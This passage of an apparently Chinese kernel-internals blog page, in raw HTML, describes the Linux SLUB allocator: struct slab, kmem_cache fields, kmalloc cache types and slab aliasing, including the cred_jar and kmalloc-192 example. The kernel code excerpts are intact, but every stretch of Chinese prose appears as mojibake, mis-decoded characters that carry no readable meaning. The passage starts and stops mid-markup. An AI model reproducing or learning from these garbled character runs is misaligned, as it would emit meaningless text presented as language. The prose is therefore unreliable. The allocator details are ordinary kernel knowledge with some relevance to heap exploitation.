çš„åŸºæœ¬ç»“æ„</h1><p>é¦–å…ˆæ¥ä¸€å¼  Overviewï¼š</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h2 id="ä¸€ã€slabï¼šå•ä»½-object-æ± "><a href="#ä¸€ã€slabï¼šå•ä»½-object-æ± " class="headerlink" title="ä¸€ã€slabï¼šå•ä»½ object æ± "></a>ä¸€ã€slabï¼šå•ä»½ object æ± </h2><p>Linux kernel ä¸­ç”¨ä»¥ç»Ÿç­¹æ‰€æœ‰å†…å­˜çš„ä¾ç„¶æ˜¯ buddy systemï¼Œslub allocator ä¹Ÿä¸ä¾‹å¤–ï¼Œå…¶è´Ÿè´£å‘ buddy system è¯·æ±‚å†…å­˜ååˆ†å‰²ç»™å¤šä¸ªå° object åå†è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼Œ<strong>å•æ¬¡å‘ buddy system æ‰€è¯·æ±‚çš„ä¸€ä»½è¿ç»­å†…å­˜é¡µä¾¿ç§°ä¹‹ä¸ºä¸€å¼  slab</strong>ï¼Œåœ¨å†…æ ¸ä¸­å¯¹åº” <code>slab</code> ç»“æ„ä½“ï¼Œ<strong>æœ¬è´¨ä¸Šæ˜¯å¤ç”¨ page ç»“æ„ä½“</strong>ï¼š</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬ä»…å…³æ³¨ slubï¼Œæ‰€ä»¥ç¬”è€…ä»…æˆªå– slub æ‰€éœ€å­—æ®µ</p><blockquote><p>è€ç‰ˆæœ¬ä¸­ slab æ˜¯ç›´æ¥å†…åµŒåœ¨ page ç»“æ„ä½“ä¸­çš„</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* å‰©ä½™çš„ slabs æ•°é‡ */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>slab_cache</code> ï¼šè¯¥ slab å¯¹åº”çš„å†…å­˜æ± </li><li><code>freelist</code> ï¼š<strong>Slab ä¸Šçš„ç©ºé—²å¯¹è±¡ç»„ç»‡ä¸ºä¸€ä¸ª NULL ç»“å°¾çš„å•å‘é“¾è¡¨</strong>ï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼Œè€—å°½æ—¶ä¸º NULL</li><li><code>slab_list</code> ï¼šæŒ‰ç”¨é€”è¿æ¥å¤šä¸ª slabs çš„åŒå‘é“¾è¡¨</li><li><code>inuse</code> ï¼šå·²è¢«ä½¿ç”¨çš„å¯¹è±¡æ•°é‡</li><li><code>objects</code>ï¼šè¯¥ slab ä¸Šçš„å¯¹è±¡æ€»æ•°</li><li><code>frozen</code>ï¼šæ˜¯å¦è¢«å†»ç»“ï¼Œå³<strong>å·²ç»å½’å±äºç‰¹å®šçš„ CPU</strong></li></ul><blockquote><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ <strong>counters æˆå‘˜ç›´æ¥æ¶µç›–äº† inuse &amp; objects &amp; frozen</strong>ï¼Œåé¢ä¼šæœ‰å¤§é‡çš„ç›´æ¥é€šè¿‡ counters æˆå‘˜è¿›è¡Œèµ‹å€¼çš„æ“ä½œï¼Œ<strong>å®é™…ä¸Šå°±æ˜¯èµ‹å€¼äº† inuse &amp; objects &amp; frozen</strong></p></blockquote><p>æ­£å¦‚ä¸€ä¸ª page ç»“æ„ä½“ç›´æ¥å¯¹åº”ä¸€å¼ å†…å­˜é¡µï¼ˆæˆ–å¤åˆé¡µï¼‰ï¼Œå¤ç”¨äº† page ç»“æ„ä½“çš„ slab ä¹Ÿ<strong>ç›´æ¥å¯¹åº”ä¸€ä»½ slab å†…å­˜é¡µ</strong>ï¼Œå€ŸåŠ© <code>page_to_pfn()</code> ç­‰å‡½æ•°å¯ä»¥ç›´æ¥å®Œæˆ slab ç»“æ„ä½“åˆ°å¯¹åº”å†…å­˜é¡µè™šæ‹Ÿåœ°å€çš„è½¬æ¢ï¼Œåä¹‹äº¦ç„¶ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„è™šæ‹Ÿåœ°å€æ‰¾åˆ°å¯¹åº”çš„ slab ç»“æ„ä½“</strong></p><p><img src="https://s2.loli.net/2023/02/21/cBXCGF4Z18VLMzl.png" alt="image.png"></p><h2 id="äºŒã€kmem-cacheï¼šç‰¹å®šå¤§å°-amp-ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± "><a href="#äºŒã€kmem-cacheï¼šç‰¹å®šå¤§å°-amp-ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± " class="headerlink" title="äºŒã€kmem_cacheï¼šç‰¹å®šå¤§å°&amp;ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± "></a>äºŒã€kmem_cacheï¼šç‰¹å®šå¤§å°&amp;ç”¨é€”å¯¹è±¡ï¼ˆå †å—ï¼‰çš„å†…å­˜æ± </h2><p><code>kmem_cache</code> ä¸ºä¸€ä¸ªåŸºæœ¬çš„ allocator ç»„ä»¶ï¼Œå¯ä»¥ç†è§£ä¸º <strong>ç”¨äºåˆ†é…æŸä¸ªç‰¹å®šå¤§å°ï¼ˆæŸç§ç‰¹å®šç”¨é€”ï¼‰çš„å¯¹è±¡çš„å†…å­˜æ± </strong>ï¼Œæ‰€æœ‰çš„ kmem_cache æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¹¶å­˜åœ¨ä¸€ä¸ªå¯¹åº”çš„é€šç”¨ <code>kmem_cache</code> æ•°ç»„ <code>kmalloc_caches</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><blockquote><p>è€ç‰ˆæœ¬è¿˜æœ‰ä¸ª dma ä¸“ç”¨æ•°ç»„ <code>kmalloc_dma_caches</code> ï¼Œåœ¨ <a href="https://patchwork.kernel.org/project/linux-mm/patch/20180718133620.6205-2-vbabka@suse.cz/">è¿™ä¸ª commit</a> ç»™åˆå¹¶èµ·æ¥äº†</p></blockquote><h3 id="I-åŸºæœ¬ç»“æ„"><a href="#I-åŸºæœ¬ç»“æ„" class="headerlink" title="I. åŸºæœ¬ç»“æ„"></a>I. åŸºæœ¬ç»“æ„</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/linux/slub_def.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab ç¼“å­˜ç®¡ç†.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* ç”¨äºå–å› partial slabs ç­‰. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* ä¸€ä¸ªå¯¹è±¡åŒ…å«å…ƒæ•°æ®çš„å¤§å° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* ä¸€ä¸ªå¯¹è±¡ä¸åŒ…å«å…ƒæ•°æ®çš„å¤§å° */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* ç©ºé—²æŒ‡é’ˆçš„åç§» */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* è¦ä¿ç•™çš„ per cpu partial å¯¹è±¡æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* è¦ä¿ç•™çš„ per cpu partial slub æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* åˆ†é…ä¸é‡Šæ”¾ slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* ï¼ˆè¯‘æ³¨ï¼šå‘ buddy systemï¼‰åˆ†é…æ—¶æ‰€ç”¨çš„ gfp æ ‡å¿—ä½ */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* ç”¨äº slab ç¼“å­˜é”€æ¯çš„å¼•ç”¨è®¡æ•° */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* å…ƒæ•°æ®çš„åç§» */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* å¯¹é½ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab ç¼“å­˜é“¾è¡¨ */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<span class="hljs-comment">// ç”¨äºåŠ å¯† freelist æŒ‡é’ˆçš„éšæœºå€¼</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é€šè¿‡ä»ä¸€ä¸ª remote node åˆ†é…ä»¥å»ç¢ç‰‡åŒ–.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<span class="hljs-comment">// ç”¨äºåœ¨åˆå§‹åŒ–æ—¶éšæœºåŒ– freelist</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* ç”¨æˆ·æ‹·è´åŒºåŸŸçš„åç§» */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* ç”¨æˆ·æ‹·è´åŒºåŸŸçš„å¤§å° */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>cpu_slab</code>ï¼š <em>percpu å˜é‡</em> ï¼ŒæŒ‡å‘ä¸€ä¸ª <code>kmem_cache_cpu</code> ç»“æ„ä½“ï¼Œå³<strong>å½“å‰ CPU ç‹¬å çš„å†…å­˜æ± </strong></p></li><li><p><code>flags</code>ï¼šæ ‡å¿—ä½</p></li><li><p><code>min_partial</code>ï¼šnode partial é“¾è¡¨ä¸Š slab çš„<strong>æœ€å¤§æ•°é‡</strong>ï¼ˆğŸ‘´ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦å«minï¼Œä½†å®é™…åˆ¤å®šå‘æŒ¥çš„æ˜¯maxçš„ä½œç”¨ï¼‰</p></li><li><p><code>size</code>ï¼šä¸€ä¸ªå¯¹è±¡çš„å®é™…å¤§å°</p></li><li><p><code>object_size</code>ï¼šä¸€ä¸ªå¯¹è±¡æ‰€ç”¨æ•°æ®çš„å¤§å°</p><blockquote><p>ä¾‹å¦‚ <code>struct cred</code> å¤§å°ä¸º 176ï¼ˆobject_sizeï¼‰ï¼Œå®é™…åˆ†é…çš„å¯¹è±¡å¤§å°ä¸º 192 ï¼ˆsizeï¼‰</p></blockquote></li><li><p><code>offset</code>ï¼šslab ä¸Šç©ºé—²å¯¹è±¡é“¾è¡¨æŒ‡é’ˆåœ¨å¯¹è±¡ä¸Šçš„åç§»</p></li><li><p><code>oo</code> ï¼š <em>å…¶å®å°±æ˜¯ä¸€ä¸ª int</em> </p><ul><li>ä½ 16 ä½ï¼šä¸€å¼  slab ä¸Šçš„å¯¹è±¡æ•°é‡</li><li>é«˜ 16 ä½ï¼šä¸€å¼  slab çš„å¤§å°ï¼ˆ2<sup>n</sup> å¼ å†…å­˜é¡µï¼‰</li></ul></li><li><p><code>min</code>ï¼šä¸€å¼  slab ä¸Šæœ€å°‘çš„å¯¹è±¡æ•°é‡</p></li><li><p><code>allocflags</code>ï¼šå‘ buddy system è¯·æ±‚é¡µé¢æ—¶æ‰€ç”¨çš„ gfp flag</p></li><li><p><code>ctor</code>ï¼šå¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œåœ¨åˆ†é…å¯¹è±¡åä¼šè°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</p></li><li><p><code>inuse</code>ï¼šå®é™…ä¸Šå°±æ˜¯ <code>object_size</code></p></li><li><p><code>align</code>ï¼šå¯¹è±¡å¯¹é½çš„å®½åº¦</p></li><li><p>Randomed freelist ä¿æŠ¤ç›¸å…³ï¼š</p><ul><li><code>random_seq</code> ï¼šç”¨äºåœ¨ slab åˆå§‹åŒ–æ—¶éšæœºåŒ– freelist ä¸Šç©ºé—²å¯¹è±¡çš„è¿æ¥é¡ºåº</li></ul></li><li><p>Hardened Usercopy ä¿æŠ¤ç›¸å…³</p><ul><li><code>useroffset</code>ï¼šç”¨æˆ·ç©ºé—´èƒ½è¯»å†™åŒºåŸŸçš„èµ·å§‹åç§»</li><li><code>usersize</code>ï¼šç”¨æˆ·ç©ºé—´èƒ½è¯»å†™åŒºåŸŸçš„å¤§å°</li></ul></li><li><p><code>node</code>ï¼šä¸€ä¸ª <code>kmem_cache_node</code> æ•°ç»„ï¼Œå¯¹åº”å¤šä¸ª<strong>ä¸åŒ node çš„åå¤‡å†…å­˜æ± </strong></p></li></ul><p><img src="https://s2.loli.net/2023/02/21/D4idvgzLAaqIBQM.png" alt="image.png"></p><h3 id="II-ç±»å‹"><a href="#II-ç±»å‹" class="headerlink" title="II. ç±»å‹"></a>II. ç±»å‹</h3><p>åˆå§‹æ—¶ä¸€å…±æœ‰å¦‚ä¸‹å‡ ç§ç±»å‹çš„ <code>kmem_cache</code>ï¼Œåœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶è‹¥æœªæŒ‡å®šå†…å­˜æ± åˆ™ä¼šæ ¹æ®å¯¹åº”çš„ flag ä»ä¸åŒçš„ <code>kmem_cache</code> ä¸­å–ï¼š</p><ul><li><code>KMALLOC_NORMAL</code> ï¼šé€šç”¨ç±»å‹å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-*</code>ï¼Œå¯¹åº”åˆ†é… flag ä¸º <code>GFP_KERNEL</code></li><li><code>KMALLOC_DMA</code>ï¼šç”¨äº DMA çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-dma-*</code></li><li><code>KMALLOC_RECLAIM</code> å¯ä»¥è¢«å›æ”¶çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-rcl-*</code></li><li><code>KMALLOC_CGROUP</code> ï¼šç”¨äºéœ€è¦è¿›è¡Œæ•°é‡ç»Ÿè®¡ï¼ˆ<code>accounted</code>ï¼Œä¸»è¦ç”¨äº CGROUP ç›¸å…³ï¼‰çš„å†…å­˜æ± ï¼Œå¯¹åº” <code>kmalloc-cg-*</code> ï¼Œå¯¹åº”åˆ†é… flag ä¸º <code>GFP_KERNEL_ACCOUNT</code></li></ul><p>è‹¥æ˜¯æœªå¼€å¯å¯¹åº”çš„ç¼–è¯‘é€‰é¡¹ï¼Œåˆ™é»˜è®¤åˆå¹¶å…¥ <code>KMALLOC_NORMAL</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="III-slab-aliasï¼ˆmergeabilityï¼‰"><a href="#III-slab-aliasï¼ˆmergeabilityï¼‰" class="headerlink" title="III. slab aliasï¼ˆmergeabilityï¼‰"></a>III. slab aliasï¼ˆmergeabilityï¼‰</h3><p>slab alias æœºåˆ¶æ˜¯ä¸€ç§å¯¹åŒç­‰&#x2F;ç›¸è¿‘å¤§å° object çš„ <code>kmem_cache</code> è¿›è¡Œ<strong>å¤ç”¨</strong>çš„ä¸€ç§æœºåˆ¶ï¼š</p><ul><li>å½“ä¸€ä¸ª <code>kmem_cache</code> åœ¨åˆ›å»ºæ—¶ï¼Œè‹¥å·²ç»å­˜åœ¨èƒ½åˆ†é…ç›¸ç­‰&#x2F;è¿‘ä¼¼å¤§å°çš„ object çš„ <code>kmem_cache</code> ï¼Œåˆ™<strong>ä¸ä¼šåˆ›å»ºæ–°çš„ kmem_cacheï¼Œè€Œæ˜¯ä¸ºåŸæœ‰çš„ kmem_cache èµ·ä¸€ä¸ª aliasï¼Œä½œä¸ºâ€œæ–°çš„â€ kmem_cache è¿”å›</strong></li></ul><blockquote><p>ä¸¾ä¸ªğŸŒ°ï¼Œ<code>cred_jar</code> æ˜¯ä¸“é—¨ç”¨ä»¥åˆ†é… <code>cred</code> ç»“æ„ä½“çš„ <code>kmem_cache</code>ï¼Œåœ¨ Linux 4.4 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶ä¸º <code>kmalloc-192</code> çš„ aliasï¼Œå³ cred ç»“æ„ä½“ä¸å…¶ä»–çš„ 192 å¤§å°çš„ object éƒ½ä¼šä»åŒä¸€ä¸ª <code>kmem_cache</code>â€”â€”<code>kmalloc-192</code> ä¸­åˆ†é…</p></blockquote><p>å¯¹äºåˆå§‹åŒ–æ—¶è®¾ç½®äº† <code>SLAB_ACCOUNT</code> è¿™ä¸€ flag çš„ <code>kmem_cache</code> è€Œè¨€ï¼Œåˆ™ä¼šæ–°å»ºä¸€ä¸ªæ–°çš„ <code>kmem_cache</code> è€Œéä¸ºåŸæœ‰çš„å»ºç«‹ aliasï¼ŒğŸŒ°å¦‚åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ <code>cred_jar</code> ä¸ <code>kmalloc-192</code> ä¾¿æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code>ï¼Œ<strong>å½¼æ­¤ä¹‹é—´äº’ä¸å¹²æ‰°</strong></p><h2 id="ä¸‰ã€kmem-cache-cpuï¼šå„-CPU-ç‹¬å å†…å­˜æ± "><a href="#ä¸‰ã€kmem-cache-cpuï¼šå„-CPU-ç‹¬å å†…å­˜æ± " class="headerlink" title="ä¸‰ã€kmem_cache_cpuï¼šå„ CPU ç‹¬å å†…å­˜æ± "></a>ä¸‰ã€kmem_cache_cpuï¼šå„ CPU ç‹¬å å†…å­˜æ± </h2><p>å½“è¿›ç¨‹å‘ slab allocator è¯·æ±‚å†…å­˜åˆ†é…æ—¶ï¼Œé¦–å…ˆä¼šå°è¯•ä»å½“å‰ CPU çš„ç‹¬å å†…å­˜æ± è¿›è¡Œåˆ†é… â€”â€”<code>kmem_cache_cpu</code> ç»“æ„ä½“è¡¨ç¤º<strong>æ¯ä¸ª CPU ç‹¬å çš„å†…å­˜æ± </strong>ï¼Œå…¶åœ¨ <code>kmem_cache</code> ä¸­ä¸ºä¸€ä¸ª percpu å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 